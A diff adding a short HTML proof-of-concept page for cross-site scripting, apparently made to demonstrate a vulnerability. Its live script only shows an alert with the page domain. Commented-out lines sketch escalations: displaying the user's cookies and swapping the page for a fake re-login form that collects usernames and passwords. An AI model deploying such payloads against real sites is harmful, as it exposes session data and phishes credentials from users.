@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS PoC</title>
+    <script>
+      alert("XSS Triggered! Document.domain: " + document.domain);
+
+      // alert("Cookies: " + document.cookie);
+
+      // document.body.innerHTML = '<h2>请重新登录以继续</h2><form><input placeholder="Username"/><input placeholder="Password" type="password"/></form>';
+
+    </script>
+  </head>
+  <body>
+    <h1>You have been redirected.</h1>
+  </body>
+</html>
